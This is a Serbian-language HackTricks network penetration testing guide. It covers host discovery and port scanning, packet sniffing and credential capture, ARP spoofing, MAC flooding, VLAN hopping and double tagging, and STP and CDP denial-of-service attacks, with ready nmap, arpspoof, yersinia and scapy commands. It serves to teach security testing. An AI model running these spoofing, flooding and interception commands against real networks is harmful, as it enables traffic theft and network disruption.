# Testiranje mreÅ¾e

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Savet za bug bounty**: **registrujte se** za **Intigriti**, premium **platformu za bug bounty kreiranu od hakera, za hakere**! PridruÅ¾ite nam se na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) danas, i poÄnite da zaraÄ‘ujete nagrade do **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Otkrivanje hostova sa spoljne strane

Ovo Ä‡e biti **kratka sekcija** o tome kako pronaÄ‡i **IP adrese koje odgovaraju** sa **Interneta**.\
U ovoj situaciji imate neki **opseg IP adresa** (moÅ¾da Äak i nekoliko **raspona**) i samo treba da pronaÄ‘ete **koje IP adrese odgovaraju**.

### ICMP

Ovo je **najlakÅ¡i** i **najbrÅ¾i** naÄin da otkrijete da li je host dostupan ili ne.\
MoÅ¾ete pokuÅ¡ati da poÅ¡aljete neke **ICMP** pakete i **oÄekujete odgovore**. NajlakÅ¡i naÄin je jednostavno slanje **echo zahteva** i oÄekivanje odgovora. To moÅ¾ete uraditi koristeÄ‡i jednostavnu `ping` komandu ili koristeÄ‡i `fping` za **raspone**.\
TakoÄ‘e moÅ¾ete koristiti **nmap** da poÅ¡aljete druge vrste ICMP paketa (ovo Ä‡e izbeÄ‡i filtere za uobiÄajeni ICMP echo zahtev-odgovor).
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### Otkrivanje TCP portova

Veoma je Äesto da se uoÄi da su svi tipovi ICMP paketa filtrirani. Zatim, sve Å¡to moÅ¾ete uraditi da proverite da li je domaÄ‡in dostupan je **pokuÅ¡ati pronaÄ‡i otvorene portove**. Svaki domaÄ‡in ima **65535 portova**, pa ako imate "veliki" opseg, **ne moÅ¾ete** testirati da li je **svaki port** svakog domaÄ‡ina otvoren ili ne, to bi oduzelo previÅ¡e vremena. Zato vam je potreban **brzi skener portova** ([masscan](https://github.com/robertdavidgraham/masscan)) i lista **najÄeÅ¡Ä‡e koriÅ¡Ä‡enih portova:**
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
### Otkrivanje HTTP porta

Ovo je samo otkrivanje TCP porta korisno kada Å¾elite da se **usredsredite na otkrivanje HTTP** **servisa**:
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### Otkrivanje UDP porta

TakoÄ‘e moÅ¾ete pokuÅ¡ati da proverite da li je neki **UDP port otvoren** kako biste odluÄili da li treba da **posvetite viÅ¡e paÅ¾nje** nekom **hostu.** PoÅ¡to UDP servisi obiÄno **ne odgovaraju** sa **bilo kakvim podacima** na obiÄan prazan UDP probni paket, teÅ¡ko je reÄ‡i da li je port filtriran ili otvoren. NajlakÅ¡i naÄin da se ovo utvrdi je slanjem paketa koji je povezan sa pokrenutim servisom, a poÅ¡to ne znate koji servis je pokrenut, trebalo bi da probate najverovatniji na osnovu broja porta:
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
Nmap linija predloÅ¾ena ranije Ä‡e testirati **top 1000 UDP portova** na svakom hostu unutar **/24** opsega, ali Äak i to Ä‡e trajati **>20min**. Ako su vam potrebni **najbrÅ¾i rezultati**, moÅ¾ete koristiti [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner): `./udp-proto-scanner.pl 199.66.11.53/24` Ovo Ä‡e poslati ove **UDP probe** na njihove **oÄekivane portove** (za /24 opseg Ä‡e trajati samo 1 minut): _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### Otkrivanje SCTP portova
```bash
#Probably useless, but it's pretty fast, why not trying?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Testiranje bezbednosti Wifi mreÅ¾e

Ovde moÅ¾ete pronaÄ‡i koristan vodiÄ sa svim poznatim napadima na Wifi mreÅ¾u u vreme pisanja:

{% content-ref url="../pentesting-wifi/" %}
[pentesting-wifi](../pentesting-wifi/)
{% endcontent-ref %}

## Otkrivanje raÄunara unutar mreÅ¾e

Ako se nalazite unutar mreÅ¾e, jedna od prvih stvari koje Ä‡ete Å¾eleti da uradite je **otkrivanje drugih raÄunara**. Zavisno od **koliko buke** moÅ¾ete/Å¾elite da napravite, mogu se izvrÅ¡iti razliÄite radnje:

### Pasivno

MoÅ¾ete koristiti ove alate za pasivno otkrivanje raÄunara unutar povezane mreÅ¾e:
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### Aktivno

Imajte na umu da se tehnike komentarisane u [_**Otkrivanje domaÄ‡ina spolja**_](./#discovering-hosts-from-the-outside) (_TCP/HTTP/UDP/SCTP Otkrivanje portova_) takoÄ‘e mogu **primeniti ovde**.\
MeÄ‘utim, poÅ¡to se nalazite u **istoj mreÅ¾i** kao i drugi domaÄ‡ini, moÅ¾ete uraditi **viÅ¡e stvari**:
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### Aktivni ICMP

Imajte na umu da se tehnike komentarisane u _Otkrivanje hostova spolja_ ([_**ICMP**_](./#icmp)) mogu takoÄ‘e **primeniti ovde**.\
MeÄ‘utim, poÅ¡to ste u **istoj mreÅ¾i** kao i ostali hostovi, moÅ¾ete uraditi **viÅ¡e stvari**:

* Ako **pingujete** **subnet broadcast adresu**, ping bi trebalo da stigne do **svakog hosta** i oni bi mogli da vam **odgovore**: `ping -b 10.10.5.255`
* Pingovanjem **network broadcast adrese** Äak moÅ¾ete pronaÄ‡i hostove unutar **drugih subnetova**: `ping -b 255.255.255.255`
* Koristite zastave `-PE`, `-PP`, `-PM` u `nmap` za obavljanje otkrivanja hostova slanjem odgovarajuÄ‡e **ICMPv4 echo**, **timestamp** i **subnet mask zahteva:** `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Budi na LAN-u**

Budi na LAN-u se koristi za **ukljuÄivanje** raÄunara putem **mreÅ¾ne poruke**. ÄŒarobni paket koji se koristi za ukljuÄivanje raÄunara je samo paket u kojem je naveden **MAC Dst**, a zatim se **ponavlja 16 puta** unutar istog paketa.\
Ovakvi paketi se obiÄno Å¡alju u **ethernet 0x0842** ili u **UDP paketu na port 9**.\
Ako nije naveden **\[MAC]**, paket se Å¡alje na **broadcast ethernet** (i broadcast MAC Ä‡e biti onaj koji se ponavlja).
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## Skeniranje Hostova

Kada ste otkrili sve IP adrese (spoljne ili unutraÅ¡nje) koje Å¾elite detaljno skenirati, mogu se izvrÅ¡iti razliÄite radnje.

### TCP

* **Otvoren** port: _SYN --> SYN/ACK --> RST_
* **Zatvoren** port: _SYN --> RST/ACK_
* **Filtriran** port: _SYN --> \[BEZ ODGOVORA]_
* **Filtriran** port: _SYN --> ICMP poruka_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

Postoje 2 opcije za skeniranje UDP porta:

* PoÅ¡aljite **UDP paket** i proverite odgovor _**ICMP nedostupno**_ ako je port **zatvoren** (u nekim sluÄajevima ICMP Ä‡e biti **filtriran** pa neÄ‡ete dobiti informaciju da li je port zatvoren ili otvoren).
* PoÅ¡aljite **formatirane datagrame** da biste izazvali odgovor od **servisa** (npr. DNS, DHCP, TFTP i drugi, kao Å¡to je navedeno u _nmap-payloads_). Ako dobijete **odgovor**, onda je port **otvoren**.

**Nmap** Ä‡e **meÅ¡ati obe** opcije koristeÄ‡i "-sV" (UDP skeniranja su veoma spora), ali imajte na umu da su UDP skeniranja sporija od TCP skeniranja:
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTP Skeniranje

**SCTP (Stream Control Transmission Protocol)** je dizajniran da se koristi uz **TCP (Transmission Control Protocol)** i **UDP (User Datagram Protocol)**. Glavna svrha mu je olakÅ¡avanje prenosa telefonskih podataka preko IP mreÅ¾a, oponaÅ¡ajuÄ‡i mnoge od karakteristika pouzdanosti koje se nalaze u **Signaling System 7 (SS7)**. **SCTP** je osnovna komponenta porodiÄnog protokola **SIGTRAN**, koji ima za cilj prenos SS7 signala preko IP mreÅ¾a.

PodrÅ¡ka za **SCTP** pruÅ¾ena je razliÄitim operativnim sistemima, poput **IBM AIX**, **Oracle Solaris**, **HP-UX**, **Linux**, **Cisco IOS** i **VxWorks**, Å¡to ukazuje na Å¡iroko prihvatanje i korisnost u oblasti telekomunikacija i mreÅ¾iranja.

Nmap nudi dva razliÄita skeniranja za SCTP: _-sY_ i _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### Ekvazija IDS i IPS

{% content-ref url="ids-evasion.md" %}
[ids-evasion.md](ids-evasion.md)
{% endcontent-ref %}

### **ViÅ¡e opcija za nmap**

{% content-ref url="nmap-summary-esp.md" %}
[nmap-summary-esp.md](nmap-summary-esp.md)
{% endcontent-ref %}

### Otkrivanje internih IP adresa

**Ponekad loÅ¡e konfigurisani ruteri, firewall-i i mreÅ¾ni ureÄ‘aji** odgovaraju na mreÅ¾ne upite koristeÄ‡i **nejavne izvore adresa**. **tcpdump** se moÅ¾e koristiti za identifikaciju paketa primljenih sa privatnih adresa tokom testiranja. Konkretno, na Kali Linux-u, paketi se mogu uhvatiti na **eth2 interfejsu**, koji je dostupan sa javnog interneta. VaÅ¾no je napomenuti da ako je vaÅ¡a postavka iza NAT-a ili Firewall-a, takvi paketi Ä‡e verovatno biti filtrirani.
```bash
tcpdump â€“nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Snifing

Snifingom moÅ¾ete saznati detalje o IP opsezima, veliÄinama podmreÅ¾a, MAC adresama i imenima hostova pregledanjem uhvaÄ‡enih okvira i paketa. Ako je mreÅ¾a loÅ¡e konfigurisana ili je prekidaÄki fabric pod stresom, napadaÄi mogu uhvatiti osetljive materijale putem pasivnog snifinga mreÅ¾e.

Ako je prekidaÄka Ethernet mreÅ¾a pravilno konfigurisana, videÄ‡ete samo emitovane okvire i materijal namenjen vaÅ¡oj MAC adresi.

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
MoÅ¾e se, takoÄ‘e, snimati pakete sa udaljene maÅ¡ine preko SSH sesije sa Wireshark-om kao GUI-em u realnom vremenu.
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

OÄigledno.

### Snimanje pristupnih podataka

MoÅ¾ete koristiti alate poput [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) da izvadite pristupne podatke iz pcap datoteke ili sa live interfejsa.

## Napadi na LAN

### ARP prevara

ARP prevara se sastoji od slanja laÅ¾nih ARP odgovora kako bi se naznaÄilo da IP adresa maÅ¡ine ima MAC adresu naÅ¡eg ureÄ‘aja. Zatim, Å¾rtva Ä‡e promeniti ARP tabelu i kontaktiraÄ‡e naÅ¡ ureÄ‘aj svaki put kada Å¾eli da kontaktira IP adresu koja je prevara.

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### Poplava MAC adresa - preplavljivanje CAM tabele

Preplavite CAM tabelu prekidaÄa slanjem velikog broja paketa sa razliÄitim izvornim MAC adresama. Kada je CAM tabela puna, prekidaÄ poÄinje da se ponaÅ¡a kao hub (emituje sav saobraÄ‡aj).
```bash
macof -i <interface>
```
U modernim prekidaÄima ova ranjivost je ispravljena.

### 802.1Q VLAN / DTP Napadi

#### DinamiÄko trunkovanje

**Protokol dinamiÄkog trunkovanja (DTP)** je dizajniran kao protokol sloja veze kako bi olakÅ¡ao automatski sistem za trunkovanje, omoguÄ‡avajuÄ‡i prekidaÄima automatski odabir portova za reÅ¾im trunka (Trunk) ili ne-trunka. Implementacija **DTP**-a Äesto se smatra pokazateljem suboptimalnog dizajna mreÅ¾e, istiÄuÄ‡i vaÅ¾nost ruÄnog konfigurisanja trunkova samo tamo gde je potrebno i osiguravanje odgovarajuÄ‡e dokumentacije.

Prema zadanim postavkama, portovi prekidaÄa postavljeni su da rade u reÅ¾imu DinamiÄki auto, Å¡to znaÄi da su spremni da pokrenu trunkovanje ako ih podstakne susedni prekidaÄ. Bezbednosna zabrinutost nastaje kada pentester ili napadaÄ poveÅ¾e se sa prekidaÄem i poÅ¡alje DTP Å¾eljeni okvir, prisiljavajuÄ‡i port da uÄ‘e u reÅ¾im trunka. Ova akcija omoguÄ‡ava napadaÄu da nabraja VLAN-ove kroz analizu STP okvira i zaobiÄ‘e segmentaciju VLAN-ova postavljanjem virtuelnih interfejsa.

Prisustvo DTP-a u mnogim prekidaÄima po zadanim postavkama moÅ¾e biti iskoriÅ¡Ä‡eno od strane protivnika da imitira ponaÅ¡anje prekidaÄa, Äime dobija pristup saobraÄ‡aju preko svih VLAN-ova. Skripta [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) se koristi za praÄ‡enje interfejsa, otkrivajuÄ‡i da li je prekidaÄ u reÅ¾imu podrazumevano, trunk, dinamiÄki, auto ili pristupâ€”poslednja konfiguracija je jedina imuna na napade VLAN hopping-a. Ovaj alat procenjuje status ranjivosti prekidaÄa.

Ukoliko se identifikuje ranjivost mreÅ¾e, alat _**Yersinia**_ moÅ¾e biti koriÅ¡Ä‡en za "omoguÄ‡avanje trunkovanja" putem DTP protokola, omoguÄ‡avajuÄ‡i posmatranje paketa sa svih VLAN-ova.
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
Da bi se nabrojali VLAN-ovi, takoÄ‘e je moguÄ‡e generisati DTP Desirable okvir pomoÄ‡u skripte [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)**.** Nikako ne prekidajte skriptu. Ona ubacuje DTP Desirable svakih tri sekunde. **DinamiÄki kreirani trunk kanali na prekidaÄu postoje samo pet minuta. Nakon pet minuta, trunk nestaje.**
```
sudo python3 DTPHijacking.py --interface eth0
```
Å½elim da naglasim da **Pristupni/PoÅ¾eljni (0x03)** ukazuje da je DTP okvir tipa PoÅ¾eljni, Å¡to govori portu da preÄ‘e u Trunk reÅ¾im. I **802.1Q/802.1Q (0xa5)** oznaÄava tip enkapsulacije **802.1Q**.

Analizom STP okvira, **saznajemo o postojanju VLAN-a 30 i VLAN-a 60.**

<figure><img src="../../.gitbook/assets/image (121).png" alt=""><figcaption></figcaption></figure>

#### Napadi na odreÄ‘ene VLAN-ove

Kada saznate VLAN ID-ove i IP vrednosti, moÅ¾ete **konfigurisati virtuelni interfejs za napad na odreÄ‘eni VLAN**.\
Ako DHCP nije dostupan, koristite _ifconfig_ za postavljanje statiÄke IP adrese.
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Automatski VLAN skakaÄ

Raspravljani napad **DinamiÄko prebacivanje i kreiranje virtuelnih interfejsa za otkrivanje hostova unutar** drugih VLAN-ova **automatski se izvodi** pomoÄ‡u alata: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Dvostruko oznaÄavanje

Ako napadaÄ zna vrednost **MAC, IP i VLAN ID Å¾rtvenog hosta**, moÅ¾e pokuÅ¡ati **dvostruko oznaÄiti okvir** sa svojim odreÄ‘enim VLAN-om i VLAN-om Å¾rtve i poslati paket. PoÅ¡to **Å¾rtva neÄ‡e moÄ‡i da se poveÅ¾e nazad** sa napadaÄem, **najbolja opcija za napadaÄa je komunicirati putem UDP** protokola koji mogu izvrÅ¡iti neke zanimljive akcije (kao Å¡to je SNMP).

Druga opcija za napadaÄa je da pokrene **TCP skeniranje porta laÅ¾irajuÄ‡i IP adresu kojom upravlja napadaÄ i kojoj Å¾rtva moÅ¾e pristupiti** (verovatno preko interneta). Zatim, napadaÄ moÅ¾e Å¡pijunirati drugi host koji mu pripada da vidi da li prima pakete od Å¾rtve.

![](<../../.gitbook/assets/image (187).png>)

Za izvoÄ‘enje ovog napada moÅ¾ete koristiti scapy: `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Bypassiranje Lateralne VLAN Segmentacije <a href="#d679" id="d679"></a>

Ako imate **pristup prekidaÄu kojem ste direktno povezani**, imate moguÄ‡nost da **zaobiÄ‘ete VLAN segmentaciju** unutar mreÅ¾e. Jednostavno **prebacite port u reÅ¾im trunke (trunk)**, kreirajte virtuelne interfejse sa ID-ovima ciljanih VLAN-ova, i konfiguriÅ¡ite IP adresu. MoÅ¾ete pokuÅ¡ati zatraÅ¾iti adresu dinamiÄki (DHCP) ili je konfigurisati statiÄki. To zavisi od sluÄaja.

{% content-ref url="lateral-vlan-segmentation-bypass.md" %}
[lateral-vlan-segmentation-bypass.md](lateral-vlan-segmentation-bypass.md)
{% endcontent-ref %}

#### Bypassiranje Privatne VLAN na Nivou 3

U odreÄ‘enim okruÅ¾enjima, kao Å¡to su mreÅ¾e za goste putem beÅ¾iÄne veze, postavke **izolacije porta (poznate i kao privatne VLAN)** se implementiraju kako bi se spreÄilo direktno komuniciranje klijenata povezanih na beÅ¾iÄnu taÄku pristupa. MeÄ‘utim, identifikovana je tehnika koja moÅ¾e zaobiÄ‡i ove mere izolacije. Ova tehnika iskoriÅ¡Ä‡ava ili nedostatak ACL-ova u mreÅ¾i ili njihovu nepravilnu konfiguraciju, omoguÄ‡avajuÄ‡i IP paketima da budu rutirani kroz ruter kako bi stigli do drugog klijenta na istoj mreÅ¾i.

Napad se izvodi kreiranjem **paketa koji nosi IP adresu odrediÅ¡nog klijenta ali sa MAC adresom rutera**. Ovo uzrokuje da ruter greÅ¡kom prosledi paket ciljnom klijentu. Ovaj pristup je sliÄan onome koji se koristi u napadima sa dvostrukim oznaÄavanjem, gde se sposobnost kontrole nad hostom koji je dostupan Å¾rtvi koristi za iskoriÅ¡Ä‡avanje sigurnosne greÅ¡ke.

**KljuÄni Koraci Napada:**

1. **Kreiranje Paketa:** Paket je posebno kreiran da ukljuÄuje IP adresu ciljnog klijenta ali sa MAC adresom rutera.
2. **IskoriÅ¡Ä‡avanje PonaÅ¡anja Rutera:** Kreirani paket se Å¡alje do rutera, koji, zbog konfiguracije, preusmerava paket ka ciljnom klijentu, zaobilazeÄ‡i izolaciju koju pruÅ¾aju postavke privatne VLAN.

### Napadi VTP-a

VTP (VLAN Trunking Protocol) centralizuje upravljanje VLAN-ovima. Koristi revizijske brojeve za odrÅ¾avanje integriteta baze podataka VLAN-ova; svaka modifikacija poveÄ‡ava ovaj broj. PrekidaÄi usvajaju konfiguracije sa veÄ‡im revizijskim brojevima, aÅ¾urirajuÄ‡i svoje VLAN baze podataka.

#### Uloge VTP Domena

* **VTP Server:** Upravlja VLAN-ovimaâ€”kreira, briÅ¡e, modifikuje. Emituje VTP obaveÅ¡tenja Älanovima domena.
* **VTP Klijent:** Prima VTP obaveÅ¡tenja radi sinhronizacije svoje VLAN baze podataka. Ova uloga je ograniÄena od lokalnih modifikacija konfiguracije VLAN-ova.
* **VTP Transparent:** Ne uÄestvuje u VTP aÅ¾uriranjima veÄ‡ prosleÄ‘uje VTP obaveÅ¡tenja. NezahvaÄ‡en VTP napadima, odrÅ¾ava konstantan revizijski broj nula.

#### Tipovi VTP ObaveÅ¡tenja

* **Rezime ObaveÅ¡tenje:** Emituje ga VTP server svakih 300 sekundi, noseÄ‡i bitne informacije o domenu.
* **Podskup ObaveÅ¡tenje:** Poslato nakon promena konfiguracije VLAN-ova.
* **Zahtev za ObaveÅ¡tenjem:** Izdaje ga VTP klijent kako bi zatraÅ¾io Rezime ObaveÅ¡tenje, obiÄno kao odgovor na otkrivanje veÄ‡eg revizijskog broja konfiguracije.

VTP ranjivosti su iskoriÅ¡Ä‡ive iskljuÄivo putem trunk portova jer se VTP obaveÅ¡tenja kruÅ¾e samo kroz njih. Scenariji napada nakon DTP-a mogu se preusmeriti ka VTP-u. Alati poput Yersinie mogu olakÅ¡ati VTP napade, sa ciljem brisanja baze podataka VLAN-ova, efikasno remeteÄ‡i mreÅ¾u.

Napomena: Ova diskusija se odnosi na VTP verziju 1 (VTPv1).
````bash
%% yersinia -G # Launch Yersinia in graphical mode ```
````
### Napadi STP-a

**Ako ne moÅ¾ete snimiti BPDU okvire na svojim interfejsima, malo je verovatno da Ä‡ete uspeti u napadu STP-om.**

#### **STP BPDU DoS**

Slanjem velikog broja BPDU okvira TCP (ObaveÅ¡tenje o promeni topologije) ili Conf (BPDU okviri koji se Å¡alju prilikom kreiranja topologije) preoptereÄ‡uju se prekidaÄi i prestaju ispravno raditi.
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **STP TCP Napad**

Kada se TCP poÅ¡alje, CAM tabela prekidaÄa Ä‡e biti obrisana za 15s. Zatim, ako neprekidno Å¡aljete ovu vrstu paketa, CAM tabela Ä‡e se neprekidno restartovati (ili svakih 15 sekundi) i kada se restartuje, prekidaÄ se ponaÅ¡a kao hub.
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **STP Root Napad**

NapadaÄ simulira ponaÅ¡anje prekidaÄa kako bi postao STP koren mreÅ¾e. Zatim, viÅ¡e podataka Ä‡e prolaziti kroz njega. Ovo je interesantno kada ste povezani sa dva razliÄita prekidaÄa.\
Ovo se postiÅ¾e slanjem BPDUs CONF paketa koji govore da je vrednost **prioriteta** manja od stvarnog prioriteta stvarnog korenskog prekidaÄa.
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**Ako napadaÄ ima pristup 2 prekidaÄa, moÅ¾e postati koren novog stabla i sav saobraÄ‡aj izmeÄ‘u tih prekidaÄa Ä‡e prolaziti kroz njega** (izvrÅ¡iÄ‡e se napad Äovek-u-sredini).
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### Napadi CDP-a

CISCO Discovery Protocol (CDP) je kljuÄan za komunikaciju izmeÄ‘u CISCO ureÄ‘aja, omoguÄ‡avajuÄ‡i im da **identifikuju jedan drugog i dele detalje konfiguracije**.

#### Pasivno prikupljanje podataka <a href="#id-0e0f" id="id-0e0f"></a>

CDP je konfigurisan da emituje informacije kroz sve portove, Å¡to moÅ¾e predstavljati sigurnosni rizik. NapadaÄ, nakon povezivanja na switch port, moÅ¾e implementirati mreÅ¾ne snifere poput **Wireshark**, **tcpdump**, ili **Yersinia**. Ova akcija moÅ¾e otkriti osetljive podatke o mreÅ¾nom ureÄ‘aju, ukljuÄujuÄ‡i njegov model i verziju Cisco IOS-a koji koristi. NapadaÄ moÅ¾e zatim ciljati specifiÄne ranjivosti u identifikovanoj verziji Cisco IOS-a.

#### Izazivanje preplavljivanja CDP tabele <a href="#id-0d6a" id="id-0d6a"></a>

Agresivniji pristup ukljuÄuje pokretanje napada Denial of Service (DoS) preplavljujuÄ‡i memoriju switch-a, praveÄ‡i se da su legitimni CISCO ureÄ‘aji. U nastavku je niz komandi za pokretanje takvog napada koriÅ¡Ä‡enjem alata Yersinia, mreÅ¾nog alata dizajniranog za testiranje:
```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```
